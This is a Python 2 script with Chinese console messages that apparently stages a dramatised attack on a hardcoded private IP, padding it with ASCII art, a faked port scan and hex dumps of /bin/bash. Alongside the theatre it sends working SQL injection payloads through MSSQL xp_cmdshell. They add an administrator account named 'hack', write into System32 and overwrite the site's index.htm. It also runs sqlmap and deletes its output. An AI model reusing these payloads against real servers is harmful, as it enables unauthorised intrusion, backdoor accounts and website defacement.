# -*- coding: utf-8 -*-
import urllib2
import urllib
import time
import sys
import re
import random
import os
from colorama import Fore,Back,Style,init
global is_attack

def center_print(str):
    h,w=os.popen('stty size').readline().split(" ")
    left=(int(w)-len(str))/2
    space=""
    for j in xrange(0,left):
        space=" "+space
    print space+str


def first_output():

    center_print ("             ,        ,        ")
    center_print ("            /(        )`       ")
    center_print ("            \ \___   / |       ")
    center_print ("            /- _  `-/  '       ")
    center_print ("           (/\/ \ \   /\\      ")
    center_print ("           / /   | `    \\     ")
    center_print ("           O O   ) /    |      ")
    center_print ("           `-^--'`<     '      ")
    center_print ("          (_.)  _  )   /       ")
    center_print ("           `.___/`    /        ")
    center_print ("             `-----' /         ")
    center_print ("<----.     __ / __   \\        ")
    center_print ("<----|====O)))==) \) /====     ")
    center_print ("<----'    `--' `.__,' \\       ")
    center_print ("             |        |        ")
    center_print ("              \       /        ")
    center_print ("        ______( (_  / \______  ")
    center_print ("      ,'  ,-----'   |        \\")
    center_print ("      `--{__________)        \/")
def end_succes():
    center_print ("                  *** ###  ### ***                   ")
    center_print ("              *##                  ##*               ")
    center_print ("          *##                          ##*           ")
    center_print ("       *##                                ##*        ")
    center_print ("     *##                                    ##*      ")
    center_print ("   *##          **                **          ##*    ")
    center_print ("  *##          *@@*              *@@*          ##*   ")
    center_print ("  *##          *@@*              *@@*          ##*   ")
    center_print (" *##            **                **            ##*  ")
    center_print ("*##                                              ##* ")
    center_print ("*##                      ___                     ##* ")
    center_print ("*##                     |BY:|                    ##* ")
    center_print ("*##        s            |CCW|           s        ##* ")
    center_print ("*##         s            ---           s         ##* ")
    center_print (" *##         s                        s         ##*  ")
    center_print ("  *##         's                    s'         ##*   ")
    center_print ("   *##          's                s'          ##*    ")
    center_print ("     *##          's            s'          ##*      ")
    center_print ("       *##           ~ |~v~v~v|           ##*        ")
    center_print ("          *##          |      |        ##*           ")
    center_print ("              *##      |   |  |     ##*              ")
    center_print ("                  ***  |   |  | ***                  ")
    center_print ("                       |   |  |                      ")
    center_print ("                       |   |  |                      ")
    center_print ("                       |   |  |                      ")
    center_print ("                       |      |                      ")
    center_print ("                       |  /\  |                      ")
    center_print ("                       |/    \|                      ")

def end_fail():
    center_print ("                       __---__                     ")
    center_print ("                    _-       /--______             ")
    center_print ("               __--( /     \ )XXXXXXXXXXX\v.       ")
    center_print ("             .-XXX(   O   O  )XXXXXXXXXXXXXXX-     ")
    center_print ("            /XXX(       U     )        XXXXXXX\\   ")
    center_print ("         /XXXXX(              )--_  XXXXXXXXXXX\\  ")
    center_print ("         /XXXXX/ (      O     )   XXXXXX   \XXXXX\\")
    center_print ("         XXXXX/   /            XXXXXX   \__ \XXXXX ")
    center_print ("         XXXXXX__/          XXXXXX         \__---->")
    center_print (" ---___  XXX__/          XXXXXX      \__         / ")
    center_print ("   \-  --__/   ___/\  XXXXXX            /  ___--/= ")
    center_print ("    \-\    ___/    XXXXXX              '--- XXXXXX ")
    center_print ("       \-\/XXX\ XXXXXX                      /XXXXX ")
    center_print ("         \XXXXXXXXX   \                    /XXXXX/ ")
    center_print ("          \XXXXXX      >                 _/XXXXX/  ")
    center_print ("            \XXXXX--__/              __-- XXXX/    ")
    center_print ("             -XXXXXXXX---------------  XXXXXX-     ")
    center_print ("               \XXXXXXXXXXXXXXXXXXXXXXXXXX/        ")
    center_print ("                  ""VXXXXXXXXXXXXXXXXXXV""         ")


def crawl(host):
    try:
        website="http://"+host+"/"
        openwebsite = urllib2.urlopen(website)
        htmlSource = openwebsite.read()
        #print htmlSource
        linksList = re.findall('<a href=(.*?)>.*?</a>', htmlSource)
        for link in linksList:
            center_print ("http://"+host+link[1:-1]+"?id=or 1=1 --")
            time.sleep(0.5)
        center_print ("test.ashx?id=or 1=1")
    except:
        print '\033[1;31;40m'
        center_print ("目标连接失败，尝试用暴力方式进行攻击")
        print '\033[0m'
def del_file(host):
    center_print ("开始尝试替换用户桌面")
    time.sleep(3)
    try:
        del_data="1; exec ..xp_cmdshell 'echo 1 > c:\Windows\System32\lalala.txt'"
        full_url="http://"+host+"/test.ashx?id="+urllib.quote(del_data)
        #print full_url
        html=urllib2.urlopen(full_url)
        print html.read()
        time.sleep(3)
        center_print ("" + Fore.GREEN + Style.BRIGHT+"替换用户桌面成功")
    except:
        center_print ("" + Fore.RED + Style.BRIGHT+"替换用户桌面失败")

def is_safe(host):
    center_print ("开始检测目标ip："+host)
    for i in range(0,3):
        sys.stdout.write(".")
        sys.stdout.flush()
        time.sleep(2)
    print ""
def scan_port_os(host):
    ay=[]
    open_port=[445,139,1433,3389,80]
    for randomi in xrange(0,100):
        ay.append(random.randint(10,10000))
    ay.append(80)
    ay.append(1433)
    ay.append(3389)
    ay.append(139)
    ay.append(445)
    ay.sort()
    news_ay = []
    for id in ay:
        if id not in news_ay:
            news_ay.append(id)
    for i in news_ay:
        if(i in open_port):
            print '\033[1;31;42m'
            center_print ("检测到" + str(i) + "开放")
            print '\033[0m'
            time.sleep(1)
        center_print ("检测端口"+str(i)+"是否开放")
        time.sleep(0.1)
    center_print ("" + Fore.GREEN + Style.BRIGHT +"port        status        service     ")
    center_print ("" + Fore.BLUE+   Style.BRIGHT +"80            open        http        ")
    center_print ("" + Fore.BLUE + Style.BRIGHT + "139           open        microsoft-ds")
    center_print ("" + Fore.BLUE + Style.BRIGHT + "445           open        microsoft-ds")
    center_print ("" + Fore.BLUE + Style.BRIGHT + "1433          open        mssql       ")
    center_print ("" + Fore.BLUE + Style.BRIGHT + "3389          open        rdp         ")
    center_print (""+Fore.RESET+Style.RESET_ALL)
    center_print ("检测操作系统：")
    center_print ("是否为unix   ")
    time.sleep(2)
    center_print ("是否为linux  ")
    time.sleep(2)
    center_print ("是否为windows")
    time.sleep(2)
    center_print (""+ Fore.GREEN + Style.BRIGHT+"检测系统成功，系统为:windows")
    print "" + Fore.RESET + Style.RESET_ALL
    center_print ("检测漏洞")
    crawl(host)
    center_print ("发现有sql注入漏洞，开始攻击")
    time.sleep(5)
    cool_show("/bin/bash")

def cool_show(binary):
    f = open(binary, 'rb')
    f.seek(0, 0)
    index = 0
    while True:
        temp = f.read(1)
        if len(temp) == 0:
            break
        else:
            print "%3s" % temp.encode('hex'),
            #index = index + 1
        if index == 16:
            index = 0
            print
        #time.sleep(0.1)
    f.close()

def attack(ipaddr,i):
    if(i==0):
        global is_attack
        is_attack=1
        return
    url_host="http://"+ipaddr+"/test.ashx?id=1"
    raw_data=" ;exec ..xp_cmdshell 'net user hack Admin123 /add && net localgroup administrators hack /add'"
    urldata=urllib.quote(raw_data)
    #print url_host+urldata
    try:
        res=urllib2.urlopen(url_host+urldata)
        print res.read()
        center_print ("尝试添加用户hack")
        print '\033[1;31;42m'
        time.sleep(1)
        center_print ("攻击成功")
        print '\033[0m'
    except:
        print '\033[1;31;40m'
        center_print ("攻击失败,尝试重新攻击")
        print '\033[0m'
        time.sleep(2)
        attack(ipaddr,i-1)

def replace_index(host):
    raw_url="http://"+host+"/"+"test.ashx?id="
    url_data="1;exec ..xp_cmdshell 'copy C:\\inetpub\\wwwroot\\1.txt C:\\inetpub\\wwwroot\\index.htm'"
    url=raw_url+urllib.quote(url_data)
    center_print("开始替换网页")
    cool_show("/bin/ls")
    try:
        res=urllib2.urlopen(url)
        print res.read()
        center_print (""+ Fore.GREEN + Style.BRIGHT+"替换网页成功")
    except:
        center_print ("" + Fore.RED + Style.BRIGHT+"替换网页失败")


def res_out():
    center_print ("" + Fore.RED + Style.BRIGHT+Back.BLACK+"服务器被成功攻陷")
    center_print ("" + Fore.RED + Style.BRIGHT + Back.BLACK + "服务器被成功攻陷")
if __name__ == '__main__':
    #ipaddr=sys.argv[1]
    global is_attack
    is_attack=0
    ipaddr="10.21.140.75"
    first_output()
    is_safe(ipaddr)
    scan_port_os(ipaddr)
    attack(ipaddr,5)
    del_file(ipaddr)
    time.sleep(3)
    replace_index(ipaddr)
    if(is_attack==0):
        os.system('sh ~/sqlmap')
        os.system('rm -rf ~/.sqlmap/output')
        res_out()
        print ""+Fore.WHITE+Style.BRIGHT+Back.BLACK+""
        end_succes()
    else:
        end_fail()
    print "" + Fore.RESET + Style.RESET_ALL
    print "\033[0m "
